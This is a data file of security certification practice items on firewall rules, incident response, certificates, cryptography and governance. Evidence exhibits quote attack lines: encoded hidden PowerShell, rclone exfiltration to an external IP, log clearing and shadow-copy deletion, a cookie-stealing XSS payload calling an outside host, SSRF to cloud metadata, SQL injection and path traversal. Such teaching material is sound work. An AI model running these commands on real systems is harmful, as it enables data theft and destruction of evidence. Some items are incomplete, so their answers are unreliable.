title: Rebuild the firewall rule set
prompt: Requirements: (1) Only HR (10.10.30.0/24) may reach the payroll server 10.10.20.15 on HTTPS. (2) Every other server in 10.10.20.0/24 must accept HTTPS from anywhere. (3) Admins in 10.10.5.0/24 may SSH to payroll, except the contractor at 10.10.5.77. (4) Internal hosts may query DNS at 10.10.1.10. (5) Everything else is blocked and logged. Put the rules in the correct order and set each action. Rules are processed top-down, first match wins.
why: Specific rules go above the broad rules they overlap: HR permit above the payroll deny, the payroll deny above the subnet-wide permit, and the contractor deny above the admin permit. The logged deny-all goes last.

title: Trace traffic through the ACL
prompt: For each flow, choose what happens. There is no rule after rule 6.
exhibit:
#  Action  Proto  Source            Destination       Port
1  PERMIT  TCP    172.16.10.0/24    any               80,443
2  DENY    TCP    172.16.10.66      any               any
3  PERMIT  TCP    any               172.16.50.10      25
4  PERMIT  UDP    172.16.0.0/16     172.16.1.53       53
5  DENY    TCP    any               172.16.50.0/24    any   (log)
6  PERMIT  TCP    172.16.20.0/24    172.16.50.0/24    3389
why: .66 hits rule 1 first for 443, so rule 2 only catches its other ports. Rule 5 shadows rule 6, so RDP to 172.16.50.0/24 never reaches the permit. TCP 53 matches nothing and falls to implicit deny.

title: Order the ransomware response
prompt: At 02:40 the SOC confirms ransomware spreading from workstation WS-HR-112 to file server FS-02 using the stolen svc_backup service account. The CISO wants evidence preserved for law enforcement. Put the response actions in the order they should happen.

items.text: Confirm the alerts and scope which hosts and accounts are affected
Isolate WS-HR-112 and FS-02 with EDR and disable svc_backup
Remove persistence and close the entry point
Restore FS-02 from clean, verified backups
Monitor restored systems closely for reinfection
Hold the lessons-learned review and update playbooks

why: Analysis, then containment, with memory captured before anything is wiped. Eradication comes before recovery, recovery is monitored, and lessons learned comes last.

title: Read the attack timeline
prompt: A credit union's SIEM produced the timeline below overnight. Classify the attacker tactic shown by each log entry, then choose the best containment action at 02:33, two minutes after the last entry.
exhibit:
01:12  WS-HR-112  WINWORD.EXE → powershell.exe -nop -w hidden -enc SQBFAFgA...
01:40  DC-01      4625 ×312 for svc_backup from WS-HR-112, then 4624 success
02:09  FS-02      PsExec service installed, launched from WS-HR-112
02:18  FS-02      rclone.exe → 185.220.101.47, 4.8 GB outbound
02:29  FS-02      wevtutil cl Security
02:31  FS-02      vssadmin delete shadows /all /quiet

rows.label: 01:12 Word spawns encoded PowerShell
01:40 312 failures, then success
02:09 PsExec from the workstation
02:18 rclone, 4.8 GB out
02:29 wevtutil cl Security
02:31 vssadmin delete shadows
Best action at 02:33
rows.a: Isolate both hosts with EDR and disable svc_backup
choices: Isolate both hosts with EDR and disable svc_backup
Power off every server in the data center

why: Deleting shadow copies right after exfiltration means encryption is minutes away. Containment must cover every host and the stolen credential while keeping memory for forensics.

title: Match each wireless requirement
prompt: A hospital is redesigning Wi-Fi for clinical, staff, branch, and guest networks. Choose the best authentication or configuration for each network requirement below. Some choices are not used.

rows.label: Clinical tablets authenticate with device certificates; no passwords; revoke devices one at a time
Staff laptops use existing AD passwords; only the RADIUS server has a certificate
Small branch uses one shared passphrase that must resist offline cracking
Lobby Wi-Fi must be encrypted but needs no password
Guests must accept terms before getting internet access
Legacy devices need PAP inside a TLS tunnel
Classified lab requires the CNSA-grade suite

why: Certificates on both sides is EAP-TLS. A server cert plus a password inside the tunnel is PEAP, and TTLS supports legacy inner methods. SAE stops offline cracking, OWE encrypts open networks, and a captive portal handles terms.

title: Identify the access control approach
prompt: A bank's auditors are mapping access decisions across the organization. For each scenario they observed, choose the access control model or principle it MOST specifically describes. Some choices are not used.

rows.label: A file's owner decides who can open it
Clearance labels are enforced by the system; users can't change them
All tellers get the same rights through the Teller group
Access only for Finance users on managed devices in the U.S.
Every login is blocked from 10 PM to 6 AM for everyone
The person who creates a vendor can't approve its payments
A help desk tech gets password-reset rights but not admin rights

why: Owner decides = DAC; labels = MAC; job role = RBAC; many attributes = ABAC; one system-wide rule = rule-based.

title: Prioritize the scan findings
prompt: A hospital's monthly scan produced the five findings below, and the team can fix one per day. Order them from first to fix to last, weighing exposure, active exploitation, and data at risk, not just the CVSS number.

items.text: CVSS 9.8 RCE on the internet-facing VPN appliance, listed in CISA KEV
CVSS 8.1 on an internal file server, public exploit available
CVSS 6.5 on the public website, no known exploit
CVSS 9.0 on an isolated lab VM with no network connection
CVSS 4.3 information disclosure on a branch printer

why: Actively exploited and internet-facing comes first. An isolated lab box ranks low despite its 9.0 because nothing can reach it.

title: Pick the DNS or email control
prompt: A credit union is hardening its domain after attackers spoofed its email and poisoned a branch resolver. Match each requirement from the project plan to the single best control. Some choices are not used.

rows.label: Publish which servers may send mail for the domain
Sign outgoing mail so receivers can verify it wasn't altered
Tell receivers to reject mail that fails alignment, and send reports
Let resolvers verify A records weren't forged
Require TLS for inbound mail without deploying DNSSEC
Pin the mail server's certificate in DNS (requires DNSSEC)
Encrypt employees' DNS queries to the resolver

why: SPF lists senders, DKIM signs, DMARC sets policy. DNSSEC signs records, DANE uses them to pin certs, MTA-STS uses HTTPS instead, and DoH encrypts queries.

title: Place the security devices
prompt: The diagram shows a hospital network. Choose what belongs at each numbered location, or whether nothing belongs there, then pick the IPS failure mode and the load balancing setting. Some devices are not used.
exhibit:
Internet ─[L1]─ Perimeter FW ─[L2]─[L3]─ Web servers (DMZ)
                     │
               Internal FW ─[L4]─ Core switch ─(mirror port)─[L5]
                                   │
                     Mgmt VLAN [L6]     User access ports [L7]

rows.label: L1
L2
L3
L4 (must block automatically)
L5 (visibility, no latency)
L6
L7
IPS failure mode (patient care must continue)
Load balancing (sessions live in one server's memory)

why: A WAF outside the perimeter firewall would be unprotected, so L1 stays empty. Blocking needs inline (IPS); a mirror port can only feed an IDS. Availability wins in a hospital, so fail-open.

title: Match the resilience control
prompt: A regional bank's business impact analysis lists the recovery requirements below. For each requirement, choose the control or site type that meets it at the lowest reasonable cost. Some choices are not used.

rows.label: Take over within minutes after losing the primary site
Cheapest option; weeks to recover is acceptable
Hardware ready, but data must be loaded first
Recover the database to any specific minute
No data loss if the primary storage array dies
Survive ransomware run by an attacker with domain admin
Bridge the 30 seconds before backup power starts
Run for three days without utility power

why: Replication protects against hardware loss but copies corruption; journaling rewinds. Only backups an attacker can't change survive ransomware.

title: Shared responsibility
prompt: A credit union runs workloads in IaaS, PaaS, and SaaS. An examiner asks who is responsible for each task under the shared responsibility model. Choose the party responsible for each, considering the service model named in each row.

rows.label: IaaS: patching the guest operating system
IaaS: physical security of the hosts
PaaS: vulnerabilities in the customer's application code
PaaS: patching the runtime and underlying OS
SaaS: managing user accounts and MFA
SaaS: patching the application
Any model: classifying the data stored in the service
IaaS: setting storage bucket access permissions

why: The provider always owns the physical layer; the customer always owns its data, identities, and its own configuration choices.

title: Replace insecure protocols
prompt: An audit of a credit union's network found the insecure protocols below still in use. For each one, choose the secure replacement and its default port that the firewall team should allow instead. Some choices are not used.

rows.label: Telnet for router management
FTP for file transfers
LDAP on 389 for directory lookups
HTTP for the member portal
SNMPv2c community strings
Syslog on UDP 514
IMAP on 143
POP3 on 110

why: SFTP rides on SSH at 22; LDAPS is 636; secure syslog is 6514; IMAPS 993 and POP3S 995.

title: Identify the attack from the evidence
prompt: A bank's WAF, web server, and network logs captured the evidence below during one week. Match each piece of evidence to the attack it MOST specifically shows. Some choices are not used.

rows.label: GET /search?q=<script>new Image().src='//x.io/?c='+document.cookie</script>
POST /avatar url=http://169.254.169.254/latest/meta-data/iam/
GET /account?id=1' OR '1'='1
GET /download?file=../../../../etc/passwd
Forum post:
Thousands of half-open TCP connections from spoofed IPs
Many hosts' ARP tables now map the gateway IP to one laptop's MAC

why: Script reading cookies = XSS; the server fetching an internal URL = SSRF; the victim's browser sending a request = CSRF; ../ on disk paths = traversal.

title: Name the technique
prompt: A credit union's security awareness team is building case studies from real reports. For each scenario, choose the MOST specific social engineering term that applies, even if a broader term would also fit. Some choices are not used.

rows.label: A caller quotes a real outage ticket number; what made the call believable?
A text says the member's account is locked and links to a login page
A real vendor mailbox asks AP to change the vendor's bank account
A phishing email is crafted specifically for the CFO
An industry forum staff visit daily is compromised to serve malware
Attackers register exmaple-cu.org
Same SSID, stronger signal, and a deauthentication flood

why: Each answer is the most specific term: the story is pretexting, a compromised business mailbox is BEC, and a cloned SSID is an evil twin, not just a rogue AP.

title: Name the indicator
prompt: A SOC analyst at a credit union reviews the week's observations below. Match each observation to the indicator of malicious activity it MOST directly represents. Some choices are not used.

rows.label: Login from Phoenix, then Singapore 25 minutes later
One VPN account active from Denver and Aurora at the same time
40 users locked out within ten minutes
No Security log entries from 01:00 to 01:40 on a running DC
Backup jobs run at 2 PM instead of 2 AM, no change ticket
A workstation sends 30 GB outbound overnight
The proxy keeps blocking one host from a known malware domain
Member records appear for sale on a leak site

why: Check the clocks before the map: overlap is concurrent use, impossible distance is travel.

title: Match the best mitigation
prompt: A bank's penetration test report lists the attacks below, each of which succeeded. For each attack, choose the single best mitigation the team can deploy, given the constraints noted. Some choices are not used.

rows.label: Stored XSS steals session cookies; code fix is weeks away
Forged transfer requests from other sites
SSRF against the cloud metadata service
Reverse-proxy (AiTM) phishing that relays MFA
Pass-the-hash between workstations
ARP poisoning on the user VLAN
MAC flooding of the access switch
Deauth floods pushing clients to an evil twin

why: Each mitigation targets exactly how the attack works: script reads cookie, browser sends forged request, server fetches URL, codes get relayed, a hash opens every machine.

title: Troubleshoot the certificates
prompt: Today is 2026-11-15. Users report TLS warnings and failures for several services, summarized below. Identify the main problem with each certificate deployment, or choose no problem. Some choices are not used.
exhibit:
A  vpn.corp.example.com   valid to 2026-10-01   EKU ServerAuth   chain OK
B  SAN *.corp.example.com  used on a.vpn.corp.example.com   EKU ServerAuth   chain OK
C  portal.example.com      EKU Code Signing (1.3.6.1.5.5.7.3.3)   chain OK
D  guest.example.com       issued by internal CA not in phones' trust store
E  www.example.com         server sends leaf only; intermediate missing
F  mail.example.com        serial listed on the issuer's CRL (key compromise)
G  app.example.com         valid to 2027-03-01   SAN matches   EKU ServerAuth   chain OK

rows.label: Certificate A
Certificate B
Certificate C
Certificate D
Certificate E
Certificate F
Certificate G

why: A wildcard covers exactly one label, so it fails on a.vpn. TLS servers need the Server Authentication EKU. Check dates, name, chain, revocation, then EKU.

title: Classify the controls
prompt: A credit union is labeling every control in its inventory. Choose the control type for each of the first seven rows, then the control category for the last four. Some types are used more than once.

rows.label: Firewall ACL blocking inbound RDP
SIEM alert on impossible travel
Restoring files from backup after an attack
"Video surveillance in use" sign
Isolating an unpatchable legacy system on its own VLAN
Acceptable use policy employees must follow
IPS dropping a known exploit in transit
Annual risk assessment process
Bollards at the branch entrance
Guards' nightly patrol procedure
Full-disk encryption on laptops

why: Type is what the control does (prevent, detect, correct, deter, compensate, direct); category is how it's implemented (technical, managerial, operational, physical).

title: Pick the cryptographic tool
prompt: A bank's security architect must pick a cryptographic tool for each requirement in a new design. Choose the best tool for each requirement listed. Some choices are not used, and each requirement has one best answer.

rows.label: Encrypt a 2 TB backup quickly
Store user passwords
Agree on session keys with perfect forward secrecy
Detect whether a downloaded file changed
Prove the CFO approved the document (non-repudiation)
Protect the CA's signing keys in the data center
Store BitLocker keys on each laptop
Let a trusted party recover lost encryption keys

why: Symmetric for bulk, slow salted hashing for passwords, ephemeral DH for PFS, signatures for non-repudiation; HSM is the data-center vault, TPM is the laptop chip.

title: Name the document
prompt: A credit union's GRC analyst is filing documents from legal, IT, and procurement. Match each description or excerpt to the document type it represents. Some choices are not used.

rows.label: 99.95% monthly uptime with service credits
Non-binding intent to share threat intelligence
Umbrella terms for all future work with a consultancy
One project's deliverables, timeline, and cost
Two credit unions split a shared branch network's costs and profits
Contractor must keep network diagrams confidential
"All laptops use AES-256 full-disk encryption with TPM 2.0"
"Consider using a password manager"
"1. Open BitLocker. 2. Select Turn On…"

why: Partners splitting profit = BPA, not MSA. Named settings = standard; steps = procedure; "consider" = guideline.

title: Work the risk numbers
prompt: Use the exhibit to answer each part.
exhibit:
Asset value (AV):          $400,000
Exposure factor (EF):      30%
Annual rate (ARO):         0.5
Proposed control:          $25,000 per year; lowers ARO to 0.1

rows.label: Single loss expectancy (SLE)
ALE before the control
ALE after the control
Annual value of the control
Buying cyber insurance for the rest is which treatment?
Should the control be bought on cost alone?
choices: No, it costs more than it saves
Only if ARO drops to zero

title: Vendors and data roles
prompt: A credit union is preparing for an examination of its vendor and data governance program. Match each description from its documentation to the correct term. Some choices are not used.

rows.label: Contract term letting you inspect the vendor after signing
Checking where a vendor's chips and firmware come from before award
Vendor provides a SOC 2 Type II from a CPA firm
Tracking the vendor's security rating every quarter
Business manager accountable for classifying loan data
IT team that runs backups and encryption as instructed
Payroll company that processes employee data on your instructions
Organization that decides why and how personal data is processed

why: Right-to-audit happens after signing; supply chain analysis looks at sub-suppliers before. Owners decide, custodians implement, controllers set purpose, processors follow instructions.

title: Handle the erasure request
prompt: An EU member of a credit union's European subsidiary submits a valid GDPR erasure request. For each data set the subsidiary holds about her, choose the correct action, considering legal obligations and holds.
choices: Retain, restricted to the legal purpose

rows.label: Marketing preferences
Support chat transcripts
Invoices tax law requires keeping for seven years
rows.a: Retain, restricted to the legal purpose

rows.label: Loan file subject to active litigation
Statistics already fully anonymized
Website analytics tied to the member's account ID

why: Erasure exceptions cover only data the law requires or litigation needs. Truly anonymized data isn't personal data anymore, but analytics tied to an account ID still is.

title: Map the zero trust architecture
prompt: An architect is documenting a hospital's new zero trust design for the board. Match each description in the design document to the zero trust component or concept it describes. Some choices are not used.

rows.label: Decides whether to allow the request using the trust algorithm
Sets up or tears down the session based on that decision
Gateway in the traffic path that allows or blocks the connection
The user or device requesting access
Area behind the gateway where traffic is trusted
Login from a new country triggers an extra factor
Each app gets only the minimum access to shrink the blast radius

why: Engine = judge, Administrator = clerk, PEP = bailiff at the door. PE and PA form the control plane; PEP, subjects, and trust zones are the data plane.
